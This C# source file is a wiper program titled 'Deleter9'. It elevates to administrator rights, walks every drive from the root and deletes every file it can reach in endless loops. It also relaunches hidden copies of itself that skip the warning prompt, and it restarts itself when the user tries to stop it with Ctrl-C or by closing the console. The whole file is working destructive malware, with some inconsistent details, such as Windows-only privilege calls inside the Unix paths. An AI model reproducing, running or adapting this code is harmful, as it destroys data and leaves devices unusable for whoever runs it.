namespace System
{
    public class OS
    {
        static OS detectedOS;
        public bool IsWin;
        public string ProcessFilePath;
        public virtual void RestartProcess() => Diagnostics.Process.Start(Reflection.Assembly.GetEntryAssembly().Location);
        public static string GetExePath() => Reflection.Assembly.GetEntryAssembly().Location;
        public static string GetRuntimeExePath() => Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
        public unsafe static OS Get()
        {
            detectedOS ??= Type.GetType("Mono.Runtime") != null
                    ? new Mono()
                    : Environment.OSVersion.Platform switch
                    {
                        PlatformID.Win32S or PlatformID.Win32Windows or PlatformID.Win32NT or PlatformID.WinCE or PlatformID.Xbox => new Win(),
                        _ => TryGet(),
                    };
            return detectedOS;
        }
        [Runtime.InteropServices.DllImport("libc")]
        unsafe static extern void uname(sbyte* uname_struct);
        unsafe static OS TryGet()
        {
            try
            {
                sbyte* utsname = stackalloc sbyte[8192];
                uname(utsname);
                string kernel = new(utsname);
                return kernel.ToLower().Contains("linux") ? new Linux() : new Unix();
            }
            catch
            {
                return new OS()
                {
                    IsWin = false,
                    ProcessFilePath = IO.Path.GetFullPath(Reflection.Assembly.GetExecutingAssembly().Location)
                };
            }
        }
    }
    public class Win : OS
    {
        public Win()
        {
            IsWin = true;
            ProcessFilePath = IO.Path.GetFullPath(Reflection.Assembly.GetEntryAssembly().Location);
        }
    }
    public class Unix : OS
    {
        public Unix()
        {
            IsWin = false;
            ProcessFilePath = IO.Path.GetFullPath(Reflection.Assembly.GetExecutingAssembly().Location);
        }
        public override void RestartProcess() => RestartInPlace();
        public virtual void RestartInPlace()
        {
            execvp(GetRuntimeExePath(), new string[]
            {
                GetRuntimeExePath(),
                GetExePath(),
                null
            });
            Console.Out.WriteLine("execvp {0} failed: {1}", GetRuntimeExePath(), Runtime.InteropServices.Marshal.GetLastWin32Error());
            Console.Out.Flush();
        }
        [Runtime.InteropServices.DllImport("libc", SetLastError = true)]
        public static extern int execvp(string path, string[] argv);
        public static string[] GetProcessCommandLineArgs()
        {
            using IO.StreamReader r = new("/proc/self/cmdline");
            string[] args = r.ReadToEnd().Split('\0');
            args[args.Length - 1] = null;
            return args;
        }
    }
    public class Mono : Unix
    {
        public Mono()
        {
            IsWin = false;
            ProcessFilePath = IO.Path.GetFullPath(Diagnostics.Process.GetCurrentProcess().MainModule.FileName);
        }
        public override void RestartProcess()
        {
            try
            {
                execvp(GetRuntimeExePath(), GetProcessCommandLineArgs());
            }
            catch (Exception ex)
            {
                Console.Out.WriteLine("Error restarting process: {0}", ex);
                Console.Out.Flush();
            }
            RestartInPlace();
        }
    }
    public class Linux : Unix
    {
        public Linux()
        {
            IsWin = false;
            ProcessFilePath = IO.Path.GetFullPath(Diagnostics.Process.GetCurrentProcess().MainModule.FileName);
        }
        public override void RestartInPlace()
        {
            try
            {
                execvp(GetRuntimeExePath(), GetProcessCommandLineArgs());
            }
            catch (Exception ex)
            {
                Console.Out.WriteLine("Error restarting process: {0}", ex);
                Console.Out.Flush();
            }
            base.RestartInPlace();
        }
    }
    public class Deleter
    {
        delegate bool ConsoleEventDelegate(int eventType);
        [Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
        static extern bool SetConsoleCtrlHandler(ConsoleEventDelegate callback, bool add);
        static ConsoleEventDelegate handler;
        [Runtime.InteropServices.DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool EnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
        public const string Ver = "1.2", Title = "Deleter9 v" + Ver;
        static string[] LogicalDrives;
        static Collections.Generic.List<IO.DriveInfo> Disks = new()
        {
        };
        static readonly Collections.Generic.List<string> DirectoriesList = new()
        {
        };
        static string FileName = string.Empty,
            FileExtension = string.Empty;
        static double Double, LoopingDouble, Count = 0;
        static readonly string Argument = "                                                                      ....                          \n                                                                    ..-+=:...                       \n                                                                 ..+########..                      \n                                                              ..=##########*...                     \n                                                             .:###########*###-.                    \n                 ........                                 ..:##############*##*..                   \n               ....-####+:..                             .:*##################..                    \n              ..=######+*##+:....                      ..=###################..                     \n              .++*#######*+####=:...                 ..-###################*.                       \n              .=*################*-...              ..=###################=..                       \n               ..=##########++#####*=:...          .-###################*:..                        \n                ..-##################==...       ..+###################=..                          \n                 ..-*##################*+=:.   ..-*##################*:..                           \n                   ..=**##################*+-..:*###################=.                              \n                    ...:#*###################++#################**=...                              \n                       ..*####################################=++:...                               \n                        ..+#################################=+=:.                                   \n                         ..:+##############################+=:.                                     \n                            ..-############################-..                                      \n                               ..=#######################*:..                                       \n                                ...+######################-.                                        \n                                ..+#*##################*###*:..                                     \n                               .:#####*-################**####..                                    \n                              .##**+*=#####################*###*..                                  \n                           ..-*#*##=-###*-=+################-:###+...                               \n                         ...+#:=*+.-*#+..-*###################-=###-...                             \n                        ..-+-:=-:.=**:-.-#####*-*+**###########*-+###+...                           \n                       ..:===-::.:--..:=####*:...+=-*+*####***###+-+###-..                          \n                     ..:.----:=-+--:.+#####-.    .:+++++#####*+*###=:*##*:..                        \n                    ..---=*=-===+:..+####+:.      ...+==:+*####+*####-:*##=..                       \n                   ..:--=++=+#+*:.:*###*:.           .:+*=+*#####+*####-=##*:                       \n                ....=--+**##**#:.+###*:.              ..:**+**######*###*=*##=..                    \n                ..:--:+*##***-..+#**:.                 ...:+###=+####***##**##*-..                  \n              ..::..-=*#*-*=..=#+*-...                    ..:*##*=-*####***#**##=..                 \n            ..:...:==##==+..:***=..                          .-+##*+=-+##++###++#*:..               \n           ......--+**=+:..-+*=..                             ..:+##*+-+##*+###+-+#+.               \n         .......::+#==-...:+=..                                  .:*###*+#*#*+###+:**:.             \n        .........=+=-....==...                                    ...+###***#*##*+#-:==.            \n       ........:*==:...-+:..                                        ...=*###***+#*-=*.:-..          \n        .  ...--:....:+....                                           ...:==+*:=+*#=-:=...          \n          ....-....:=:..                                                ....:-:-.=#+-.:=:.          \n         ...... ..=:..                                                       ......-=-..::.         \n           ... .:..                                                             .:.........         \n              ..                                                                  ...  .....        \n";
        static readonly string[] Messages = Argument.Split('\n');
        static bool FileDeleted = false, IsCloned = false;
        static Exception Exception;
        static bool CanAccess(string folderPath, out Exception ex)
        {
            try
            {
                new IO.DirectoryInfo(folderPath).GetAccessControl(Security.AccessControl.AccessControlSections.All);
                ex = null;
                return true;
            }
            catch (Security.AccessControl.PrivilegeNotHeldException e)
            {
                ex = e;
                return false;
            }
        }
        static void AddDir(string dir)
        {
            if (!DirectoriesList.Contains(dir))
            {
                if (CanAccess(dir, out Exception ex))
                    DirectoriesList.Add(dir);
                else
                {
                    Console.Out.WriteLine("Can't access " + dir + ex);
                    Console.Out.Flush();
                }
            }
            foreach (string d in IO.Directory.GetDirectories(dir))
                if (CanAccess(d, out Exception ex))
                {
                    DirectoriesList.Add(d);
                    AddDir(d);
                }
                else
                {
                    Console.Out.WriteLine("Can't access " + d + ex);
                    Console.Out.Flush();
                }
        }
        static void TryDeleteFile(string file)
        {
            if (IO.File.Exists(file))
                try
                {
                    Console.Out.WriteLine("Deleting " + file);
                    Console.Out.Flush();
                    IO.File.Delete(file);
                    if (!IO.File.Exists(file))
                        FileDeleted = true;
                    else
                    {
                        Exception = new InvalidOperationException("Failed to delete file: " + file);
                        FileDeleted = false;
                    }
                }
                catch (Exception e)
                {
                    Exception = e;
                    FileDeleted = false;
                }
            else
                FileDeleted = true;
        }
        static void ContinueDeletingUnix()
        {
            try
            {
                RtlAdjustPrivilege(19, true, false, out _);
            }
            catch
            {
                Console.Out.WriteLine("Failed to adjust privileges, continuing without them.");
                Console.Out.Flush();
            }
            Console.Clear();
            Count++;
            Console.Out.WriteLine(Count);
            Console.Out.Flush();
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.BackgroundColor = ConsoleColor.Black;
            Threading.Thread.Sleep(200);
            Console.Out.WriteLine(Messages);
            Console.Out.Flush();
            string root = IO.Directory.GetDirectoryRoot(IO.Directory.GetCurrentDirectory());
            switch (root)
            {
                case null:
                case "":
                    root = "/";
                    break;
            }
            AddDir(root);
            while (LoopingDouble != double.PositiveInfinity)
            {
                LoopingDouble++;
                try
                {
                    foreach (string dir in DirectoriesList)
                        foreach (string file in IO.Directory.GetFiles(dir))
                        {
                            TryDeleteFile(file);
                            if (!FileDeleted)
                            {
                                Console.Out.WriteLine("Failed to delete file: " + file);
                                Console.Out.Flush();
                                Console.Out.WriteLine(Exception);
                                Console.Out.Flush();
                            }
                        }
                }
                catch
                {
                    DeleteDirUnix();
                }
            }
        }
        static void DeleteDirUnix()
        {
            try
            {
                RtlAdjustPrivilege(19, true, false, out _);
            }
            catch
            {
                Console.Out.WriteLine("Failed to adjust privileges, continuing without them.");
                Console.Out.Flush();
            }
            Console.ForegroundColor = ConsoleColor.Red;
            Console.BackgroundColor = ConsoleColor.Black;
            Console.Out.WriteLine(Messages);
            Console.Out.Flush();
            string root = IO.Directory.GetDirectoryRoot(IO.Directory.GetCurrentDirectory());
            switch (root)
            {
                case null:
                case "":
                    root = "/";
                    break;
            }
            AddDir(root);
            while (LoopingDouble != double.PositiveInfinity)
            {
                LoopingDouble++;
                try
                {
                    foreach (string dir in DirectoriesList)
                        foreach (string file in IO.Directory.GetFiles(dir))
                        {
                            TryDeleteFile(file);
                            if (!FileDeleted)
                            {
                                Console.Out.WriteLine("Failed to delete file: " + file);
                                Console.Out.Flush();
                                Console.Out.WriteLine(Exception);
                                Console.Out.Flush();
                            }
                        }
                }
                catch
                {
                    ContinueDeletingUnix();
                }
            }
        }
        static void DeleteDir()
        {
            try
            {
                Console.Clear();
                Console.Out.WriteLine(Messages);
                Console.Out.Flush();
                LogicalDrives = IO.Directory.GetLogicalDrives();
                Disks = new Collections.Generic.List<IO.DriveInfo>(IO.DriveInfo.GetDrives());
                foreach (IO.DriveInfo disk in Disks)
                {
                    if (disk.Name != disk.VolumeLabel)
                        Console.Out.WriteLine("Current drive is: " + disk.Name + disk.VolumeLabel);
                    else
                        Console.Out.WriteLine("Current drive is: " + disk.Name);
                    Console.Out.Flush();
                    foreach (string drive in LogicalDrives)
                    {
                        string root = IO.Directory.GetDirectoryRoot(drive);
                        switch (root)
                        {
                            case null:
                            case "":
                                root = "/";
                                break;
                        }
                        AddDir(root);
                        foreach (string dir in DirectoriesList)
                            foreach (string file in IO.Directory.GetFiles(dir))
                            {
                                TryDeleteFile(file);
                                if (!FileDeleted)
                                {
                                    Console.Out.WriteLine("Failed to delete file: " + file);
                                    Console.Out.Flush();
                                    Console.Out.WriteLine(Exception);
                                    Console.Out.Flush();
                                }
                            }
                    }
                }
            }
            catch
            {
                while (LoopingDouble != double.PositiveInfinity)
                {
                    LoopingDouble++;
                    ContinueDeleting();
                }
            }
        }
        static void ContinueDeleting()
        {
            try
            {
                Count++;
                LogicalDrives = IO.Directory.GetLogicalDrives();
                Disks = new Collections.Generic.List<IO.DriveInfo>(IO.DriveInfo.GetDrives());
                Console.Out.WriteLine(Count);
                Console.Out.Flush();
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.BackgroundColor = ConsoleColor.Black;
                Threading.Thread.Sleep(200);
                Console.Out.WriteLine(Messages);
                Console.Out.Flush();
                foreach (IO.DriveInfo disk in Disks)
                {
                    if (disk.Name != disk.VolumeLabel)
                        Console.Out.WriteLine("Current drive is: " + disk.Name + disk.VolumeLabel);
                    else
                        Console.Out.WriteLine("Current drive is: " + disk.Name);
                    Console.Out.Flush();
                    foreach (string drive in LogicalDrives)
                    {
                        string root = IO.Directory.GetDirectoryRoot(drive);
                        switch (root)
                        {
                            case null:
                            case "":
                                root = "/";
                                break;
                        }
                        AddDir(root);
                        foreach (string dir in DirectoriesList)
                            foreach (string file in IO.Directory.GetFiles(dir))
                            {
                                TryDeleteFile(file);
                                if (!FileDeleted)
                                {
                                    Console.Out.WriteLine("Failed to delete file: " + file);
                                    Console.Out.Flush();
                                    Console.Out.WriteLine(Exception);
                                    Console.Out.Flush();
                                }
                            }
                    }
                }
            }
            catch
            {
                while (LoopingDouble != double.PositiveInfinity)
                {
                    LoopingDouble++;
                    DeleteDir();
                }
            }
        }
        static bool ConsoleEventCallback(int eventType)
        {
            OS.Get().RestartProcess();
            return false;
        }
        static void OnCancelKeyPress(object sender, ConsoleCancelEventArgs e) => OS.Get().RestartProcess();
        static void Continue()
        {
            FileExtension = IO.Path.GetExtension(OS.Get().ProcessFilePath);
            FileName = IO.Path.GetFileNameWithoutExtension(OS.Get().ProcessFilePath);
            if (OS.Get().IsWin)
            {
                Console.CancelKeyPress += OnCancelKeyPress;
                handler = new(ConsoleEventCallback);
                SetConsoleCtrlHandler(handler, true);
                Console.Title = Title;
                Console.ForegroundColor = ConsoleColor.Red;
                Console.BackgroundColor = ConsoleColor.Black;
            }
            Threading.Thread.Sleep(1000);
            while (Double != double.PositiveInfinity)
                try
                {
                    Double++;
                    if (!OS.Get().IsWin)
                        DeleteDirUnix();
                    else
                    {
                        IO.File.Copy(IO.Path.GetFileName(OS.Get().ProcessFilePath), FileName + " (" + Double + ")" + FileExtension);
                        Diagnostics.Process p = new();
                        p.StartInfo.UseShellExecute = true;
                        p.StartInfo.Verb = "runas";
                        p.StartInfo.FileName = FileName + "(" +
                            Double + ")" + FileExtension;
                        p.StartInfo.Arguments = "cloned " + Argument;
                        p.StartInfo.CreateNoWindow = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.WindowStyle = Diagnostics.ProcessWindowStyle.Hidden;
                        p.Start();
                        DeleteDir();
                    }
                }
                catch
                {
                    while (LoopingDouble != double.PositiveInfinity)
                    {
                        LoopingDouble++;
                        Start();
                    }
                }
        }
        public static void Main(string[] args)
        {
            string arguments = "";
            foreach (string arg in args)
                arguments += arg;
            IsCloned = arguments.ToLower().Contains("cloned");
            if (!IsCloned)
            {
                Console.Out.WriteLine("WARNING! THIS DELETES THE ROOT DIRECTORY! " +
                    "EXECUTING THIS WILL RENDER YOUR DEVICE UNUSABLE!");
                Console.Out.Flush();
                Console.Out.WriteLine("ARE YOU SURE YOU WANT TO CONTINUE? Y OR N");
                Console.Out.Flush();
                if (!Console.ReadLine().ToUpper().Contains("Y"))
                    Environment.Exit(0);
            }
            if (Security.Principal.WindowsIdentity.GetCurrent().IsSystem 
                || Security.Principal.WindowsIdentity.GetCurrent().User.ToString() == "S-1-5-18"  
                || new Security.Principal.WindowsPrincipal(Security.Principal.WindowsIdentity.GetCurrent()).IsInRole(Security.Principal.WindowsBuiltInRole.Administrator))
                Start();
            else
                try
                {
                    Diagnostics.Process p = new();
                    p.StartInfo.FileName = Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
                    p.StartInfo.RedirectStandardOutput = false;
                    p.StartInfo.RedirectStandardError = false;
                    p.StartInfo.CreateNoWindow = false;
                    p.StartInfo.UseShellExecute = true;
                    p.StartInfo.Verb = "runas";
                    p.StartInfo.Arguments = Argument;
                    p.Start();
                    Environment.Exit(0);
                }
                catch (Exception e)
                {
                    Console.Out.WriteLine("Error when deleting: {0}", e);
                    Console.Out.Flush();
                    Console.ReadKey();
                    Environment.Exit(0);
                }
        }
        static void Start()
        {
            FileExtension = IO.Path.GetExtension(OS.Get().ProcessFilePath);
            FileName = IO.Path.GetFileNameWithoutExtension(OS.Get().ProcessFilePath);
            if (OS.Get().IsWin)
            {
                Console.CancelKeyPress += OnCancelKeyPress;
                handler = new(ConsoleEventCallback);
                SetConsoleCtrlHandler(handler, true);
                Console.Title = Title;
                Console.ForegroundColor = ConsoleColor.Red;
                Console.BackgroundColor = ConsoleColor.Black;
            }
            Threading.Thread.Sleep(1000);
            while (Double != double.PositiveInfinity)
                try
                {
                    Double++;
                    if (!OS.Get().IsWin)
                        DeleteDirUnix();
                    else
                    {
                        IO.File.Copy(IO.Path.GetFileName(OS.Get().ProcessFilePath), FileName + " (" + Double + ")" + FileExtension);
                        Diagnostics.Process p = new();
                        p.StartInfo.UseShellExecute = true;
                        p.StartInfo.Verb = "runas";
                        p.StartInfo.FileName = FileName + "(" +
                            Double + ")" + FileExtension;
                        p.StartInfo.Arguments = "cloned " + Argument;
                        p.StartInfo.CreateNoWindow = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.WindowStyle = Diagnostics.ProcessWindowStyle.Hidden;
                        p.Start();
                        DeleteDir();
                    }
                }
                catch
                {
                    while (LoopingDouble != double.PositiveInfinity)
                    {
                        LoopingDouble++;
                        Continue();
                    }
                }
        }
    }
}